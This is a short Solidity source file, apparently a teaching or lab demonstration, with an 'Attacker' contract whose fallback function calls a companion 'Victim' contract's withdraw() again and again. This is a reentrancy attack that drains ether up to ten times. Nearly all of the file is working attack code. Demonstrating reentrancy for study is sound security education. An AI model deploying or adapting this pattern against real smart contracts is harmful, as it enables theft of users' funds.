pragma solidity ^0.4.23;
import './Victim.sol';

/**
 * The attack contract does this and that...
 */
contract Attacker {
  Victim v;
  uint counter;
  event LogFallBack(uint c, uint balance);

  constructor(address a){
    v = Victim(a);
  }

  function attack(){
    v.withdraw();
  }


  function() payable{
    counter++;
    emit LogFallBack(counter, msg.value);
    if(counter<10){
      v.withdraw();
    }
  }
}
